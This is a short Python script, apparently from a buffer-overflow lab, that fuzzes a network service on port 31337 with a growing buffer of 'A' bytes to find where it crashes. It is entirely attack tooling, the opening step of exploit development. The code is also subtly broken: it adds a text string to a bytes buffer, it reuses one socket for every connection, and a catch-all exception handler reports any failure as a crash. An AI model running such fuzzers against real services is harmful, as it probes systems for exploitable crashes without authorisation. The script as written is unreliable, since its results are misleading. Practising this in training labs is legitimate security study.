#!/usr/bin/env python3

import socket, time, sys

ip = "10.10.234.180"

port = 31337
timeout = 5
#prefix = "OVERFLOW10 "

#string = prefix + "A" * 100
string = b"A" * 100

#count = 0

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

while True:
  try:
    #with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.connect((ip, port))
    s.settimeout(timeout)
    
      #s.recv(1024)

      #if count != 0:
      #  s.send(bytes("Username", "latin-1"))
      #  count = count + 1

    s.recv(1024)
    print("Fuzzing with {} bytes".format(len(string)))
      #s.send(bytes(string, "latin-1"))
    s.send(string)
    s.recv(1024)
  except:
    print("Fuzzing crashed at {} bytes".format(len(string)))
    sys.exit(0)
  string += 100 * "A"
  time.sleep(1)